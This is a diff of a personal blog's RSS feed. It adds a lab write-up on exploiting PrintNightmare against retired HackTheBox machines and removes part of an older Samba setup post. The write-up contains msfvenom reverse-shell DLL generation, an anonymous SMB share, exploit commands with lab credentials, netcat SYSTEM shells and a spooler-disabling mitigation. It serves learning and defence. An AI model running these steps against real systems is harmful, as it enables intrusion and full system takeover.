@@ -5,7 +5,305 @@
     <link>https://fahmifj.github.io/</link>
     <description>Recent content on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 17 Jul 2021 13:52:01 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Play with PrintNightmare using HackTheBox machines</title>
+      <link>https://fahmifj.github.io/blog/play-with-printnightmare-using-hackthebox-machines/</link>
+      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/play-with-printnightmare-using-hackthebox-machines/</guid>
+      <description>In the past week, a lot of InfoSec pros I follow in Twitter were tweeting about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by Chinese security researchers after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service.</description>
+      <content:encoded><![CDATA[<p>In the past week, a lot of InfoSec pros I follow in Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by Chinese security researchers after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding were CVE-2021-1675, but it turned out to be different.</p>
+<p>In this post, I would like to play with the vulnerability using HackTheBox retired machines as targets.</p>
+<h2 id="target-machines">Target Machines</h2>
+<p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
+<center>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Target</th>
+<th style="text-align:center">IP</th>
+<th style="text-align:center">Low Priv Credentials [username:password]</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Active</td>
+<td style="text-align:center">10.10.10.100</td>
+<td style="text-align:center">svc_tgs:GPPstillStandingStrong2k18</td>
+</tr>
+<tr>
+<td style="text-align:center">Bastion</td>
+<td style="text-align:center">10.10.10.134</td>
+<td style="text-align:center">l4mpje:bureaulampje</td>
+</tr>
+<tr>
+<td style="text-align:center">Heist</td>
+<td style="text-align:center">10.10.10.149</td>
+<td style="text-align:center">hazard:stealth1agent</td>
+</tr>
+<tr>
+<td style="text-align:center">Forest</td>
+<td style="text-align:center">10.10.10.161</td>
+<td style="text-align:center">svc-alfresco:s3rvice</td>
+</tr>
+<tr>
+<td style="text-align:center">Atom</td>
+<td style="text-align:center">10.10.10.237</td>
+<td style="text-align:center">jason:kidvscat_electron_@123</td>
+</tr>
+</tbody>
+</table>
+</center>
+<h2 id="printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</h2>
+<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>.</p>
+<h3 id="working-directory-preparation">Working Directory Preparation</h3>
+<p>To work with the exploit, I&rsquo;ll have to change my impacket version to the one that has been modified by Cube0x0. This could potentially mess my Kali Linux system. Therefore, I&rsquo;ll just setup a virtual environment using Python  <code>venv</code> module.</p>
+<p>First, I&rsquo;ll create a new folder called <code>printnightmare</code> in <code>/opt/</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
+$ mkdir printnightmare <span style="color:#f92672">&amp;&amp;</span> cd printnightmare
+</code></pre></div><p>I&rsquo;ll clone the exploit PoC as well as the modified impacket inside <code>printnightmare</code> folder. I&rsquo;ll rename the PoC to <code>CVE-2021-1675-cube0x0</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ git clone https://github.com/cube0x0/CVE-2021-1675.git <span style="color:#f92672">&amp;&amp;</span> git clone https://github.com/cube0x0/impacket
+→ kali@kali «printnightmare» «10.10.14.75» 
+$ mv CVE-2021-1675 CVE-2021-1675-cube0x0
+</code></pre></div><p>I&rsquo;ll create a virtual environment using <code>virtualenv</code> called <code>impacket-venv</code>. If you don&rsquo;t have one, install with <code>python3 -m pip install virtualenv </code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ virtualenv impacket-venv
+created virtual environment CPython3.9.2.final.0-64 in 614ms
+  creator CPython3Posix<span style="color:#f92672">(</span>dest<span style="color:#f92672">=</span>/opt/printnightmare/impacket-venv, clear<span style="color:#f92672">=</span>False, no_vcs_ignore<span style="color:#f92672">=</span>False, global<span style="color:#f92672">=</span>False<span style="color:#f92672">)</span>
+  seeder FromAppData<span style="color:#f92672">(</span>download<span style="color:#f92672">=</span>False, pip<span style="color:#f92672">=</span>bundle, setuptools<span style="color:#f92672">=</span>bundle, wheel<span style="color:#f92672">=</span>bundle, via<span style="color:#f92672">=</span>copy, app_data_dir<span style="color:#f92672">=</span>/home/kali/.local/share/virtualenv<span style="color:#f92672">)</span>
+    added seed packages: pip<span style="color:#f92672">==</span>21.1.3, setuptools<span style="color:#f92672">==</span>57.1.0, wheel<span style="color:#f92672">==</span>0.36.2
+  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
+</code></pre></div><p>I&rsquo;ll activate the virtual environment and install the cube0x0 impacket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ source impacket-venv/bin/activate <span style="color:#f92672">&amp;&amp;</span> cd impacket
+<span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «impacket» «10.10.14.75» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
+$ python3 setup.py install
+running install
+running bdist_egg
+running egg_info
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h3 id="generate-malicious-dll">Generate Malicious DLL</h3>
+<p>To exploit this, I&rsquo;ll also need a DLL, and it will be loaded by the exploit.</p>
+<p>I could generate the DLL with help of <code>msfvenom</code> . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ mkdir dll
+<span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «dll» «10.10.14.75» 
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.75 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f dll &gt; revshell.dll  
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">460</span> bytes
+Final size of dll file: <span style="color:#ae81ff">8704</span> bytes
+</code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
+<h3 id="host-dll-using-smb">Host DLL Using SMB</h3>
+<p>The DLL will be hosted using Samba/SMB share and it  must be configured to allow anonymous access. Fortunately, cube0x0 provides an instruction in the exploit repo on how to configure that.</p>
+<p>Before doing any modification, I&rsquo;ll create a backup of the configuration original file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo cp /etc/samba/smb.conf<span style="color:#f92672">{</span>,.bak<span style="color:#f92672">}</span>
+</code></pre></div><p>In my case, I&rsquo;ll use the following configuration to add a new share named <code>ef</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[ef]
+    comment = Samba
+    path = /opt/printnightmare/dll/
+    guest ok = yes
+    read only = no
+    browsable = yes
+</code></pre></div><p>Lastly, I&rsquo;ll start the Samba daemon.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo systemctl start smbd 
+</code></pre></div><h3 id="target-scanning">Target Scanning</h3>
+<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
+<ol>
+<li>Print Spooler Service enabled on the target system ❔</li>
+<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
+<li>Hash or password for a low privileged user (or computer) account  ✔</li>
+</ol>
+<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction using a tool from impacket called <code>rpcdump.py</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span style="color:#f92672">[</span>IP-ADDRESS<span style="color:#f92672">]</span> | egrep <span style="color:#e6db74">&#39;MS-RPRN|MS-PAR&#39;</span>
+</code></pre></div><p><code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. The command will returns the available printers, but if it returns &ldquo;Could not initialise spoolss&rdquo;, then the Print Spooler is most likely to be disabled.</p>
+<p>I&rsquo;ve created a dirty bash script to do these detection.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+targets<span style="color:#f92672">=</span>$1
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$targets<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+  echo <span style="color:#e6db74">&#34;[-] Usage\t: </span>$0<span style="color:#e6db74"> [Target file]&#34;</span> 
+  echo <span style="color:#e6db74">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
+  <span style="color:#66d9ef">else</span>
+	<span style="color:#66d9ef">for</span> target in <span style="color:#e6db74">`</span>cat $targets<span style="color:#e6db74">`</span>; <span style="color:#66d9ef">do</span>
+		 ip<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1<span style="color:#66d9ef">)</span>
+		 username<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f2<span style="color:#66d9ef">)</span>
+		 password<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f3<span style="color:#66d9ef">)</span>
+		 echo  <span style="color:#e6db74">&#34; - [</span>$ip<span style="color:#e6db74">] - &#34;</span> 
+		 impacket-rpcdump $ip | egrep <span style="color:#e6db74">&#39;MS-RPRN|MS-PAR&#39;</span>
+		 rpcclient -U <span style="color:#e6db74">&#34;</span>$username<span style="color:#e6db74">%</span>$password<span style="color:#e6db74">&#34;</span> $ip -c <span style="color:#e6db74">&#34;enumprinters;quit&#34;</span>
+	<span style="color:#66d9ef">done</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>It outputs the following results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ ./detect-nightmare.sh target-machines                 
+ - <span style="color:#f92672">[</span>10.10.10.100<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
+ - <span style="color:#f92672">[</span>10.10.10.134<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span style="color:#f92672">[</span>10.10.10.149<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span style="color:#f92672">[</span>10.10.10.161<span style="color:#f92672">]</span> - 
+Cannot connect to server.  Error was NT_STATUS_HOST_UNREACHABLE
+ - <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+result was WERR_INVALID_NAME
+</code></pre></div><p>Because HackTheBox - Active is likely not vulnerable, I will skip it from exploitation demo. I will also skip Forest, because it seems someone messed up with the machine. But, I&rsquo;ll add Forest to this post if it&rsquo;s up.</p>
+<h3 id="exploitation-demo">Exploitation Demo</h3>
+<h4 id="htb-bastion---101010134">HTB: Bastion - 10.10.10.134</h4>
+<p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py Bastion/l4mpje:<span style="color:#e6db74">&#39;bureaulampje&#39;</span>@10.10.10.134 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.134<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_1734185bdb8f8610<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software
+</code></pre></div><p>Unfortunately, I don&rsquo;t have Visual Studio to build an innocent DLL for reverse shell template, but the conclusion here Bastion was vulnerable.</p>
+<h4 id="htb-heist---101010149">HTB: Heist - 10.10.10.149</h4>
+<p>On Heist, the exploitation doesn&rsquo;t show any indication of successful exploitation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py heist/hazard:<span style="color:#e6db74">&#39;stealth1agent&#39;</span>@10.10.10.149 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.149<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stage0: <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 2...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span style="color:#f92672">(</span>The specified named pipe is in the closing state.<span style="color:#f92672">)</span>
+</code></pre></div><p>But strangely, I got a shell in my listener.</p>
+<pre><code>→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.75] from (UNKNOWN) [10.10.10.149] 49700
+Microsoft Windows [Version 10.0.17763.437]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;hostname
+hostname
+SupportDesk
+
+C:\Windows\system32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
+   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
+                                       10.10.10.2
+</code></pre><p><img class="img-container" src="imgs/image-20210717130728398.png" alt="image-20210717130728398"  />
+</p>
+<h4 id="htb-atom---101010161">HTB: Atom - 10.10.10.161</h4>
+<p>On Atom, the exploit also returns error.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py ATOM/jason:<span style="color:#e6db74">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.237<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_c62e9f8067f98247<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stage0: <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 2...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span style="color:#f92672">(</span>The specified named pipe is in the closing state.<span style="color:#f92672">)</span>
+</code></pre></div><p>But then the DLL connected to my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp <span style="color:#ae81ff">4444</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.75<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">62322</span>
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.19042.906<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+whoami
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;hostname
+hostname
+ATOM
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
+   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
+   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
+   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
+   IPv4 Address. . . . . . . . . . . : 10.10.10.237
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
+                                       10.10.10.2
+</code></pre></div><p><img class="img-container" src="imgs/image-20210717125927762.png" alt="image-20210717125927762"  />
+</p>
+<p>I have no clue why the error happened 😅. If I find out the problem, I&rsquo;ll update this post.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare: Disable Print Spooler service and Disable inbound remote printing through Group Policy. Also it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
+<p>As for the second option, I have no idea to work with that from CLI, so I&rsquo;ll just try the first option.</p>
+<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
+<p>Determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it using the following commands (run these consecutively).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>I&rsquo;ll apply these on Bastion</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">*Evil-WinRM* PS C:\&gt; Get-Service -Name Spooler 
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  Spooler            Print Spooler
+
+
+*Evil-WinRM* PS C:\&gt; Stop-Service -Name Spooler -Force
+*Evil-WinRM* PS C:\&gt; Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>It mitigates the attacks.</p>
+<p><img class="img-container" src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  />
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/">https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li>
+<li><a href="https://www.bitsight.com/blog/zerologon-bitsight-observations-on-a-dangerous-vulnerability">https://www.bitsight.com/blog/zerologon-bitsight-observations-on-a-dangerous-vulnerability</a></li>
+<li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Active</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
@@ -1090,168 +1388,6 @@ plugins=(git ctf)
 <li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
 <li><a href="https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background">https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</a></li>
 </ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>Setup a Samba Server in Azure and Make It Accessible Over Internet</title>
-      <link>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</link>
-      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</guid>
-      <description>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.
-In this post, I’ll share my documentation on how to setup a Samba server in Azure.
-Before proceeding further, I&amp;rsquo;ll state that:
- Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &amp;lsquo;best practice&amp;rsquo;.</description>
-      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.</p>
-<p>In this post, I’ll share my documentation on how to setup a Samba server in Azure.</p>
-<p>Before proceeding further, I&rsquo;ll state that:</p>
-<blockquote>
-<p>Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &lsquo;best practice&rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.</p>
-</blockquote>
-<h2 id="goals-and-outcomes">Goals and Outcomes</h2>
-<p>The goal here is exactly the same as what’s written in the title, but by the end of this post, you will be able to:</p>
-<ul>
-<li>Deploy an Ubuntu server in Azure</li>
-<li>Setup and Configure a Samba server</li>
-<li>Exposing Samba server over Internet</li>
-</ul>
